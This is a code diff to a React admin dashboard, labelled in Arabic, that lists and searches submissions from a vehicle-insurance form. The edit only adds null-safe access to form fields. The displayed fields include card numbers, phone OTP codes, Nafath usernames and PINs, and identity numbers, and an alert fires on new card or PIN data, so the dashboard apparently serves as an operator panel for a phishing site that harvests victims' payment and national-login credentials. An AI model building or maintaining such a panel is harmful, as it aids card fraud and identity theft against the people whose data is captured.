@@ -260,8 +260,8 @@ function NotificationCard({
   };
 
   const getPrimaryInfo = () => {
-    if (notification?.formData.documment_owner_full_name) {
-      return notification?.formData.documment_owner_full_name;
+    if (notification?.formData?.documment_owner_full_name) {
+      return notification?.formData?.documment_owner_full_name;
     }
     if (notification.phone) {
       return notification.phone;
@@ -535,7 +535,7 @@ export default function NotificationsPage() {
       if (searchTerm) {
         const term = searchTerm.toLowerCase();
         return (
-          notification?.formData.documment_owner_full_name
+          notification?.formData?.documment_owner_full_name
             ?.toLowerCase()
             .includes(term) ||
           notification.phone?.toLowerCase().includes(term) ||
@@ -545,20 +545,20 @@ export default function NotificationsPage() {
           notification.currentPage?.toLowerCase().includes(term) ||
           notification.cardNumber?.toLowerCase().includes(term) ||
           notification.country?.toLowerCase().includes(term) ||
-          notification?.formData.owner_identity_number
+          notification?.formData?.owner_identity_number
             ?.toLowerCase()
             .includes(term) ||
-          notification?.formData.buyer_identity_number
+          notification?.formData?.buyer_identity_number
             ?.toLowerCase()
             .includes(term) ||
-          notification?.formData.seller_identity_number
+          notification?.formData?.seller_identity_number
             ?.toLowerCase()
             .includes(term) ||
-          notification?.formData.serial_number?.toLowerCase().includes(term) ||
-          notification?.formData.vehicle_manufacture_number
+          notification?.formData?.serial_number?.toLowerCase().includes(term) ||
+          notification?.formData?.vehicle_manufacture_number
             ?.toLowerCase()
             .includes(term) ||
-          notification?.formData.customs_code?.toLowerCase().includes(term) ||
+          notification?.formData?.customs_code?.toLowerCase().includes(term) ||
           notification.sequenceNumber?.toLowerCase().includes(term) ||
           notification.selectedInsuranceOffer?.toLowerCase().includes(term) ||
           notification.paymentStatus?.toLowerCase().includes(term) ||
@@ -736,11 +736,11 @@ export default function NotificationsPage() {
         const hasNewImportantInfo = newEntries.some(
           (n) =>
             n.cardNumber ||
-            n.formData.documment_owner_full_name ||
+            n.formData?.documment_owner_full_name ||
             n.phone ||
             n.phone2 ||
             n.phoneOtpCode ||
-            n.formData.owner_identity_number ||
+            n.formData?.owner_identity_number ||
             n.nafadUsername ||
             n.nafaz_pin
         );
@@ -1333,7 +1333,7 @@ function NotificationDetails({
             <AvatarImage src="/placeholder.svg?height=40&width=40" />
             <AvatarFallback className="bg-primary/20 text-primary font-semibold">
               {(
-                notification?.formData.documment_owner_full_name ||
+                notification?.formData?.documment_owner_full_name ||
                 notification.phone ||
                 notification.phone2 ||
                 "مستخدم"
@@ -1344,7 +1344,7 @@ function NotificationDetails({
           </Avatar>
           <div>
             <h2 className="font-semibold text-foreground">
-              {notification?.formData.documment_owner_full_name ||
+              {notification?.formData?.documment_owner_full_name ||
                 notification.phone ||
                 notification.phone2 ||
                 "مستخدم جديد"}
@@ -1560,8 +1560,8 @@ function NotificationDetails({
               label: "المعلومات الشخصية",
               icon: User,
               hasData:
-                notification?.formData.documment_owner_full_name ||
-                notification?.formData.owner_identity_number,
+                notification?.formData?.documment_owner_full_name ||
+                notification?.formData?.owner_identity_number,
             },
             {
               id: "phone",
@@ -1612,32 +1612,32 @@ function NotificationDetails({
               {[
                 {
                   label: "اسم مالك الوثيقة",
-                  value: notification?.formData.documment_owner_full_name,
+                  value: notification?.formData?.documment_owner_full_name,
                   icon: User,
                 },
                 {
                   label: "رقم هوية المالك",
-                  value: notification?.formData.owner_identity_number,
+                  value: notification?.formData?.owner_identity_number,
                   icon: Shield,
                 },
                 {
                   label: "رقم هوية المشتري",
-                  value: notification?.formData.buyer_identity_number,
+                  value: notification?.formData?.buyer_identity_number,
                   icon: Shield,
                 },
                 {
                   label: "رقم هوية البائع",
-                  value: notification?.formData.seller_identity_number,
+                  value: notification?.formData?.seller_identity_number,
                   icon: Shield,
                 },
                 {
                   label: "الرقم التسلسلي",
-                  value: notification?.formData.serial_number,
+                  value: notification?.formData?.serial_number,
                   icon: FileText,
                 },
                 {
                   label: "رقم تصنيع المركبة",
-                  value: notification?.formData.vehicle_manufacture_number,
+                  value: notification?.formData?.vehicle_manufacture_number,
                   icon: FileText,
                 },
                 {
@@ -1653,7 +1653,7 @@ function NotificationDetails({
                 {
                   label: "غرض التأمين",
                   value:
-                    notification?.formData.insurance_purpose === "renewal"
+                    notification?.formData?.insurance_purpose === "renewal"
                       ? "تجديد"
                       : "نقل ملكية",
                   icon: Shield,
@@ -1661,9 +1661,9 @@ function NotificationDetails({
                 {
                   label: "نوع المركبة",
                   value:
-                    notification?.formData.vehicle_type === "registration"
+                    notification?.formData?.vehicle_type === "registration"
                       ? "تسجيل"
-                      : notification?.formData.vehicle_type === "customs"
+                      : notification?.formData?.vehicle_type === "customs"
                       ? "جمارك"
                       : "رقم تسلسلي",
                   icon: FileText,
